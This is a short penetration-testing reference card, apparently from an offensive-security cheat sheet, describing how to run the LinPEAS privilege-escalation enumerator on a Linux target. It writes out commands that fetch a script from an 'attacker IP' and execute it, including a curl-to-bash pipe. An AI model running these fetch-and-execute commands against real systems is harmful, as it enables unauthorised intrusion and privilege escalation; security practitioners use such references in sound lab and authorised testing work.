---
description: |
  Run LinPEAS to automatically enumerate privilege escalation vectors
  on a Linux target.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Transfer and run
  curl http://10.10.14.1/linpeas.sh | bash

  # Or download and execute
  wget http://10.10.14.1/linpeas.sh -O /tmp/linpeas.sh
  chmod +x /tmp/linpeas.sh
  /tmp/linpeas.sh | tee linpeas_output.txt
phase:
  - PrivEsc
target_os:
  - Linux
services: []
ports: []
items:
  - Shell
techniques:
  - SUID_Abuse
  - Sudo_Abuse
  - Cron_Abuse
network_position:
  - Local
references:
  - https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
---
